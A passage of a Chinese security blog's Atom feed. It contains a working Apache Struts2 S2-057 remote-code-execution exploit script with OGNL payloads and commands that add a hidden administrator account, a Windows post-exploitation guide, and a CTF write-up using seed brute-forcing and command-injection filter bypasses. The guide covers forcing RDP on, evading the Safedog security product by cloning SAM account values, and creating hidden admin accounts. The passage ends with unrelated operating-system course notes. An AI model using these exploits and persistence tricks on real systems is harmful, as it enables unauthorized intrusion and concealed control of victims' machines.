class="language-html">%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接如下的url进行测试：</p><pre><code class="language-html">127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功调用本地计算器。<br><img src="http://img.cdn.cuittk.cn/saxjp3r8qvzhblzjrpu8snx9zr.png" alt=""><br>exp:</p><pre><code class="language-python">#coding: utf-8import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot;+command+&quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    #需要进行URL编码    payload1 = &quot;&quot;    for i in range(0,len(str1),2):        payload1 += &#39;%&#39;+str1[i:i+2]    payload2 = &quot;&quot;    for i in range(0,len(str2),2):        payload2 += &#39;%&#39;+str2[i:i+2]    url1 = host+&#39;/&#39;+payload1+&#39;/&#39;+path    url2 = host+&#39;/&#39;+payload2+&#39;/&#39;+path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print &quot;Exploit successful:&quot;    print res1.content    elif res2.status_code == 200 and res1.status_code != 200:    print &quot;Exploit successful:&quot;    print res2.content    else:    print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><pre><code class="language-html">python s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.actionpython s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;net user guast Admin123a /add&quot; actionChain1.actionpython s2_057_exp.py http://192.168.123.207:8080/struts2-showcase/ &quot;net localgroup administrators guast /add&quot; actionChain1.action</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Struts2-057-CVE-2018-11776-漏洞从搭建到复现&quot;&gt;&lt;a href=&quot;#Struts2-057-CVE-2018-11776-漏洞从搭建到复现&quot; class=&quot;headerlink&quot; title=&quot;Struts2-057(CVE-2018-1
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>windows后渗透实用小结</title>
    <link href="https://blog.cuittk.cn/2018/12/25/windows%E5%90%8E%E6%B8%97%E9%80%8F%E5%AE%9E%E7%94%A8%E5%B0%8F%E7%BB%93/"/>
    <id>https://blog.cuittk.cn/2018/12/25/windows后渗透实用小结/</id>
    <published>2018-12-25T12:57:25.320Z</published>
    <updated>2020-02-26T10:20:15.620Z</updated>
    
    <content type="html"><![CDATA[<h2 id="windows后渗透实用小结"><a href="#windows后渗透实用小结" class="headerlink" title="windows后渗透实用小结"></a>windows后渗透实用小结</h2><h3 id="webshell后开启服务器3389端口"><a href="#webshell后开启服务器3389端口" class="headerlink" title="webshell后开启服务器3389端口"></a>webshell后开启服务器3389端口</h3><h4 id="开启3389命令"><a href="#开启3389命令" class="headerlink" title="开启3389命令"></a>开启3389命令</h4><p>只适用于：Win7、Win2003、XP系统，windows2012不行<br>命令：</p><pre><code class="language-html">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></pre><p>windows server 2000<br>新建文件 3389.reg 内容如下： </p><pre><code class="language-html">Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal Server]&quot;fDenyTSConnections&quot;=dword:00000000[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWdsrdpwdTdstcp]&quot;PortNumber&quot;=dword:00000D3D[HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminal ServerWinStationsRDP-Tcp]&quot;PortNumber&quot;=dword:00000D3D</code></pre><p>regedit /s C:/www/3389.reg </p><h4 id="查询远程桌面服务开启状态"><a href="#查询远程桌面服务开启状态" class="headerlink" title="查询远程桌面服务开启状态"></a>查询远程桌面服务开启状态</h4><p>查询系统是否开启远程桌面服务，命令如下：</p><pre><code class="language-html">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</code></pre><p>执行结果如图1所示：<br><img src="http://img.cdn.cuittk.cn/remote-desktop-status.png" alt=""><br>如果fDenyTSConnections的值为0x1则表示关闭；0x0表示开启。</p><h4 id="查询远程桌面服务端口号"><a href="#查询远程桌面服务端口号" class="headerlink" title="查询远程桌面服务端口号"></a>查询远程桌面服务端口号</h4><p>查询远程桌面服务端口号，命令如下：</p><pre><code class="language-html">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</code></pre><p>查询结果如图2所示：<br><img src="http://img.cdn.cuittk.cn/remote-desktop-status1.png" alt=""><br>端口格式为16进制，0xd3d转换为十进制是3389。</p><h4 id="开启远程桌面服务"><a href="#开启远程桌面服务" class="headerlink" title="开启远程桌面服务"></a>开启远程桌面服务</h4><p>如果远程桌面服务关闭的话，则需要开启，命令如下：</p><pre><code class="language-html">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /fREG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</code></pre><h3 id="查看进程列表"><a href="#查看进程列表" class="headerlink" title="查看进程列表"></a>查看进程列表</h3><p>tasklist</p><pre><code class="language-html">tasklist /svc    #查看当前进程及PID号</code></pre><p>Termsevice为远程桌面管理<br>找到TermSevice的PID</p><pre><code class="language-html">tasklist /svc | findstr &quot;TermService&quot;</code></pre><p><img src="http://img.cdn.cuittk.cn/qts9l6eeme31hwi7rl6ht5rlo9.png" alt=""></p><pre><code class="language-html">netstat -ano | find &quot;PID&quot;</code></pre><p>即可查找到真正远程服务的端口信息</p><h3 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a>dos命令大全</h3><p>查看版本：ver<br>查看权限：whoami<br>查看配置：systeminfo<br>查看用户：net user<br>查看正在运行的服务：tasklist /svc<br>查看开放的所有端口：netstat -ano<br>查询登录用户名：query user<br>查询端口开放情况：netstat -ano | findstr “LISTENING”</p><h3 id="提权绕过安全狗加账号的方法"><a href="#提权绕过安全狗加账号的方法" class="headerlink" title="提权绕过安全狗加账号的方法"></a>提权绕过安全狗加账号的方法</h3><p>前面有几个打狗棍法没写，因为没用，开着安全狗，上传的exe无法执行而且一会儿就被删了。<br>下面说几个可行的办法：</p><h4 id="打狗棍法一"><a href="#打狗棍法一" class="headerlink" title="打狗棍法一"></a>打狗棍法一</h4><p>首先，用guest，演示一下，具体操作是通过注册表，篡改sam下用户的F值，使其达到管理权限.<br>首先要是system权限，administrator对应值是1F4,GUEST是1F5<br>下面是步骤:<br>1.使用net user guest 1 ,将guest密码重置为1或者其他的密码，无需过问是guest否禁用<br>2.执行：</p><pre><code class="language-html">reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4&quot; &quot;C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\1.reg&quot;</code></pre><p>导出administrator的注册表到某路径下，修改内容，将”V”值删除，只留F值,将1F4修改为1F5,保存。<br>3.修改后执行<code>regedit /s C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\1.reg</code> 导入注册表<br>就可以使用，guest 密码 1登陆了。<br>安全狗说：在账户保护全开的情况下，如果不能更改密码呢？！</p><h4 id="打狗棍法二"><a href="#打狗棍法二" class="headerlink" title="打狗棍法二"></a>打狗棍法二</h4><p>如果真的不能更改密码呢？则使用vbs查看iis用户密码，再使用</p><pre><code class="language-html">reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\names\用户名&quot; &quot;C:\Recovery\7a284e0d-0bf0-11e2-892c-dd57e9ebb1a5\2.reg&quot;</code></pre><p>查看其对应值，再重复以上第二步和第三步，使用查看到的明文密码登陆<br>安全狗又说：<br>如果不允许修改密码，iis用户是禁止登陆远程桌面的呢？</p><h4 id="打狗棍法三"><a href="#打狗棍法三" class="headerlink" title="打狗棍法三"></a>打狗棍法三</h4><p>对啊，我们该怎么办？继续听我说，大家都知道guest是空密码，那我们就使用空密码登陆。<br>执行</p><pre><code class="language-html">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v limitblankpassworduse /t REG_DWORD /d 0 /f</code></pre><p>修改limitblankpassworduse值为1，重复上面第二第三步骤，继续登陆。</p><h4 id="打狗棍法四"><a href="#打狗棍法四" class="headerlink" title="打狗棍法四"></a>打狗棍法四</h4><p>万不得以的时候用，建议不用<br>查询在线用户query user<br>直接修改管理员密码~</p><h3 id="隐藏、克隆账号"><a href="#隐藏、克隆账号" class="headerlink" title="隐藏、克隆账号"></a>隐藏、克隆账号</h3><p>window 隐藏系统用户制作：<br>1、CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930163439919-1227761363.png" alt=""><br>PS:CMD命令行使用”net user”,看不到”test$”这个账号，但在控制面板和本地用户和组是可以显示此用户的。<br>2、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930164238012-1661863216.png" alt=""><br>3、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930165109731-2092160311.png" alt=""><br>4、扎到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930165208794-1864170243.png" alt=""><br>5、分别将test$和“000003EC导出到桌面，删除test$用户   net user test$ /del<br><img src="https://images2017.cnblogs.com/blog/894761/201709/894761-20170930170344262-1095547163.png" alt=""><br>6、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。<br>PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$r这个账户的，只有在注册表中才能看得到。<br>检测和清理方法：<br>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。<br><img src="https://images2017.cnblogs.com/blog/894761/201710/894761-20171003185352708-1067710460.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.96sec.org/blog/post/77.html" target="_blank" rel="external">http://www.96sec.org/blog/post/77.html</a><br><a href="https://www.cnblogs.com/xiaozi/p/7613288.html" target="_blank" rel="external">https://www.cnblogs.com/xiaozi/p/7613288.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;windows后渗透实用小结&quot;&gt;&lt;a href=&quot;#windows后渗透实用小结&quot; class=&quot;headerlink&quot; title=&quot;windows后渗透实用小结&quot;&gt;&lt;/a&gt;windows后渗透实用小结&lt;/h2&gt;&lt;h3 id=&quot;webshell后开启服务器338
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SWPUCTF2018 writeup</title>
    <link href="https://blog.cuittk.cn/2018/12/18/SWPUCTF2018%20writeup/"/>
    <id>https://blog.cuittk.cn/2018/12/18/SWPUCTF2018 writeup/</id>
    <published>2018-12-18T15:01:49.098Z</published>
    <updated>2020-02-26T10:27:03.911Z</updated>
    
    <content type="html"><![CDATA[<h2 id="用优惠码-买个-X"><a href="#用优惠码-买个-X" class="headerlink" title="用优惠码  买个 X ?"></a>用优惠码  买个 X ?</h2><p>flag在/flag中<br>URL <a href="http://123.207.84.13:22333" target="_blank" rel="external">http://123.207.84.13:22333</a><br><img src="http://img.cdn.cuittk.cn/1r135d6ja1ii1y0aoonfgs49gg.png" alt=""><br>注册个账号登录<br>登录提示送你优惠码<br><img src="http://img.cdn.cuittk.cn/fxyoe86lrtyjs84j2wqbwwe4uz.png" alt=""><br>优惠码保存在cookie中的Auth中<br>输入优惠码提示要输入24位的优惠码<br><img src="http://img.cdn.cuittk.cn/mxudziuc7y4on6h9ghfod6y7uj.png" alt=""><br><a href="http://123.207.84.13:22333/www.zip" target="_blank" rel="external">http://123.207.84.13:22333/www.zip</a> 源码泄露<br>只有个source.php文件</p><pre><code class="language-php">&lt;?php//生成优惠码$_SESSION[&#39;seed&#39;]=rand(0,999999999);function youhuima(){    mt_srand($_SESSION[&#39;seed&#39;]);    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;    $auth=&#39;&#39;;    $len=15;    for ( $i = 0; $i &lt; $len; $i++ ){        if($i&lt;=($len/2))              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);        else              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);    }    setcookie(&#39;Auth&#39;, $auth);}//support    if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){        if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){               //执行命令        }else {              //flag字段和某些字符被过滤!        }    }else{             // 你的输入不正确!    }?&gt;</code></pre><p>代码中只生成了15位。验证应该还有一个生成24位。<br>无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的，随机数种子是关键。但是种子范围在rand(0,999999999);<br>只能爆破了，<br>kali下php版本为7.2.4，题目的版本是PHP/7.2.9-1，我发现本地用php5.4使用一样的种子生成的是不一样的序列</p><pre><code class="language-php">&lt;?phpini_set(&#39;max_execution_time&#39;,&#39;0&#39;);function youhuima(){    mt_srand($_SESSION[&#39;seed&#39;]);    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;//62    $auth=&#39;&#39;;    $len=15;    for ( $i = 0; $i &lt; $len; $i++ ){        if($i&lt;=($len/2))              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);        else              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*(-1), 1);    }    return $auth;    //setcookie(&#39;Auth&#39;, $auth);}for($i=0;$i&lt;999999999;$i++){    $_SESSION[&#39;seed&#39;] = $i;    if(youhuima() == &quot;tmqoTcEJIQ5lrsF&quot;)    {        echo $i,&quot;&lt;/br&gt;&quot;;         echo youhuima();        exit();    }}//echo &quot;tmqoTcEJIQ5lrsF&quot;;?&gt;</code></pre><p>也就几分钟，就爆破出来了。可能是运气好<br><img src="http://img.cdn.cuittk.cn/61wmtb9k7mcdtjvv219h52nle4.png" alt=""><br>得到随机种子15252003，<br>设置$_SESSION[‘seed’]为15252003，得到优惠码tmqoTcEJsk5PJsFZfOqDZXbd<br>已经得到的session<br>PHPSESSID=42i3mgn649nj6vsvtc05h2oej6<br>进入下一个support<br><a href="http://123.207.84.13:22333/exec.php" target="_blank" rel="external">http://123.207.84.13:22333/exec.php</a><br><img src="http://img.cdn.cuittk.cn/yw0f1aa8jzizrlborax2wrzk0r.png" alt=""></p><pre><code class="language-php">if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){</code></pre><p>虽然有了开头^和结尾$，但是有/m参数，/m表示开启多行匹配模式<br>使用%0a绕过<br>1.1.1.1%0awhoami<br>不知道为什么在输入框输入不行，要用参数提交<br>POST：ip=1.1.1.1%0awhoami<br><img src="http://img.cdn.cuittk.cn/9nwzq7mw50o1oa0ipnw4aylplo.png" alt=""></p><pre><code class="language-php">if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){</code></pre><p>过滤了cat flag关键字<br>使用变量绕过</p><pre><code class="language-html">a=c;b=at;c=fl;d=ag;$a$b $c$dip=127.0.0.1%0acd ../../../;ls -l;a=c;b=at;c=fl;d=ag;$a$b $c$d</code></pre><p><img src="http://img.cdn.cuittk.cn/frk88q8abhntgwkl6yjaey8vkj.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;用优惠码-买个-X&quot;&gt;&lt;a href=&quot;#用优惠码-买个-X&quot; class=&quot;headerlink&quot; title=&quot;用优惠码  买个 X ?&quot;&gt;&lt;/a&gt;用优惠码  买个 X ?&lt;/h2&gt;&lt;p&gt;flag在/flag中&lt;br&gt;URL &lt;a href=&quot;http://1
      
    
    </summary>
    
      <category term="web安全" scheme="https://blog.cuittk.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>操作系统复习</title>
    <link href="https://blog.cuittk.cn/2018/12/10/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0/"/>
    <id>https://blog.cuittk.cn/2018/12/10/操作系统复习/</id>
    <published>2018-12-10T14:11:06.053Z</published>
    <updated>2018-12-11T12:53:07.144Z</updated>
    
    <content type="html"><![CDATA[<h2 id="操作系统复习"><a href="#操作系统复习" class="headerlink" title="操作系统复习"></a>操作系统复习</h2><h3 id="第一章-操作系统引论"><a href="#第一章-操作系统引论" class="headerlink" title="第一章 操作系统引论"></a>第一章 操作系统引论</h3><h4 id="操作系统的作用"><a href="#操作系统的作用" class="headerlink" title="操作系统的作用"></a>操作系统的作用</h4><p>1.OS作为用户与计算机硬件系统之间的接口<br>2.OS作为计算机系统资源的管理者</p><h4 id="操作系统的发展过程"><a href="#操作系统的发展过程" class="headerlink" title="操作系统的发展过程"></a>操作系统的发展过程</h4><h5 id="无操作系统的计算机系统"><a href="#无操作系统的计算机系统" class="headerlink" title="无操作系统的计算机系统"></a>无操作系统的计算机系统</h5><p>人工操作方式<br>脱机输入/输出方式</p><h5 id="单道批处理系统"><a href="#单道批处理系统" class="headerlink" title="单道批处理系统"></a>单道批处理系统</h5><p>单道批处理系统的特征<br>(1) 自动性<br>(2) 顺序性<br>(3) 单道性</p><h5 id="多道批处理系统"><a href="#多道批处理系统" class="headerlink" title="多道批处理系统"></a>多道批处理系统</h5><h6 id="1-多道程序设计的基本概念"><a href="#1-多道程序设计的基本概念" class="headerlink" title="1.多道程序设计的基本概念"></a>1.多道程序设计的基本概念</h6><p>过程：<br>作业先存放在外存上并排成一个队列，称为“后备队列”；然后，由作业调度程序按一定的算法从后备队列中选择若干个作业调入内存，使它们共享CPU和系统中的各种资源。<br>优点：<br>提高CPU的利用率<br>提高内存和I/O设备利用率<br>增加系统吞吐量</p><h6 id="2-多道批处理系统的特点"><a href="#2-多道批处理系统的特点" class="headerlink" title="2.多道批处理系统的特点"></a>2.多道批处理系统的特点</h6><p>多道：<br>多道指某个作业占用CPU，若由于某种原因暂时不用CPU，则系统让第二个作业占用CPU。<br>成批处理：<br> 用户自己不能干预自己作业的运行，一旦发现作业错误不能及时改正，并延长开发软件时间，所以适用于成熟的程序。<br> 无序性。<br> 调度性。</p><h6 id="3-多道批处理系统的优缺点"><a href="#3-多道批处理系统的优缺点" class="headerlink" title="3.多道批处理系统的优缺点"></a>3.多道批处理系统的优缺点</h6><p>(1) 资源利用率高<br>(2) 系统吞吐量大<br>(3) 可提高内存和I/O设备利用率<br>(4) 平均周转时间长<br>(5) 无交互能力。</p><font color="red">适合大型科学计算、数据处理。</font><h6 id="4-多道批处理需要解决的问题"><a href="#4-多道批处理需要解决的问题" class="headerlink" title="4.多道批处理需要解决的问题"></a>4.多道批处理需要解决的问题</h6><p> (1) 处理机管理问题。<br>(2) 内存管理问题。<br>(3) I/O设备管理问题。<br>(4) 文件管理问题。<br>(5) 作业管理问题。 </p><h5 id="分时系统-Time-Sharing-System"><a href="#分时系统-Time-Sharing-System" class="headerlink" title="分时系统(Time-Sharing System)"></a>分时系统(Time-Sharing System)</h5><h6 id="1-分时系统的产生"><a href="#1-分时系统的产生" class="headerlink" title="1.分时系统的产生"></a>1.分时系统的产生</h6><p>满足用户如下需求：<br>(1) 人—机交互<br>(2) 共享主机<br>(3) 便于用户上机<br><img src="http://img.cdn.cuittk.cn/wn5puco1om706vq32od7l56gmy.png" alt=""></p><h6 id="2-分时系统的思想"><a href="#2-分时系统的思想" class="headerlink" title="2.分时系统的思想"></a>2.分时系统的思想</h6><p>采用时间片轮的方法，同时为许多终端用户服务，对每个用户能保证足够快的响应时间，并提供交互会话的功能。<br>时间片：将CPU的时间划分成若干个片段,称为时间片，操作系统以时间片为单位,轮流为每个终端用户服务<br>设计目标：对用户的请求及时响应，并在可能条件下尽量提高系统资源的利用率。<br>适合办公自动化、教学及事务处理等要求人机会话的场合。</p><h6 id="3-分时操作系统工作方式"><a href="#3-分时操作系统工作方式" class="headerlink" title="3.分时操作系统工作方式"></a>3.分时操作系统工作方式</h6><p>一台主机连接了若干个终端<br>每个终端有一个用户在使用<br>交互式的向系统提出命令请求<br>系统接受每个用户的命令<br>采用时间片轮转方式处理服务请求<br>并通过交互方式在终端上向用户显示结果<br>用户根据上步结果发出下道命令</p><h6 id="4-分时系统实现中的关键问题"><a href="#4-分时系统实现中的关键问题" class="headerlink" title="4.分时系统实现中的关键问题"></a>4.分时系统实现中的关键问题</h6><p>(1) 及时接收。<br>(2) 及时处理。</p><h6 id="5-分时操作系统特点"><a href="#5-分时操作系统特点" class="headerlink" title="5.分时操作系统特点"></a>5.分时操作系统特点</h6><p>多路性<br>交互性<br>独立性<br>及时性</p><h6 id="6-影响响应时间的因素"><a href="#6-影响响应时间的因素" class="headerlink" title="6.影响响应时间的因素"></a>6.影响响应时间的因素</h6><p>终端数目多少<br>调度算法（时间片的选取）<br>信息交换量和信息交换速度<br>机器处理能力<br>请求服务的时间长短及服务请求的分布</p><h5 id="实时系统-Real-Time-System"><a href="#实时系统-Real-Time-System" class="headerlink" title="实时系统(Real-Time System)"></a>实时系统(Real-Time System)</h5><p>“实时”，是表示“及时”，而实时系统(Real-Time System)是指系统能及时响应外部事件的请求，在规定的时间内完成对该事件的处理，并控制所有实时任务协调一致地运行。<br>特点：及时性要求高，系统可靠性高。</p><h6 id="1-实时操作系统的分类"><a href="#1-实时操作系统的分类" class="headerlink" title="1.实时操作系统的分类"></a>1.实时操作系统的分类</h6><p>实时控制系统：通常是指以计算机为中心的生产过程控制系统，又称计算机控制系统。<br>如：钢铁冶炼和钢板轧制的自动控制、炼油、化工生产过程的自动控制,军事控制等。<br>实时信息处理系统：计算机及时接收从远程终端发来的服务请求，根据用户提出的问题对信息进行检索和处理，并在很短时间内对用户做出正确回答。<br>例如：银行，机票订购系统、股市行情实时信息处理系统等</p><h6 id="2-实时任务"><a href="#2-实时任务" class="headerlink" title="2.实时任务"></a>2.实时任务</h6><p>按任务执行时是否呈现周期性可分为：<br>周期性实时任务<br>非周期性实时任务<br>根据对截止时间的要求可分为：<br>硬实时任务<br>软实时任务 </p><h6 id="3-实时系统与分时系统特征的比较"><a href="#3-实时系统与分时系统特征的比较" class="headerlink" title="3.实时系统与分时系统特征的比较"></a><font color="red">3.实时系统与分时系统特征的比较</font></h6><p>（1）多路性<br>（2）独立性<br>（3）及时性<br>（4）交互性<br>（5）可靠性</p><h5 id="微机操作系统的发展"><a href="#微机操作系统的发展" class="headerlink" title="微机操作系统的发展"></a>微机操作系统的发展</h5><p>单用户单任务： CP/M 8位操作系统、MS-DOS 16位操作系统<br>单用户多任务操作系统: windows 系列<br>多用户多任务操作系统: unix  linux</p><h4 id="操作系统的基本特性"><a href="#操作系统的基本特性" class="headerlink" title="操作系统的基本特性"></a>操作系统的基本特性</h4><h5 id="操作系统的定义"><a 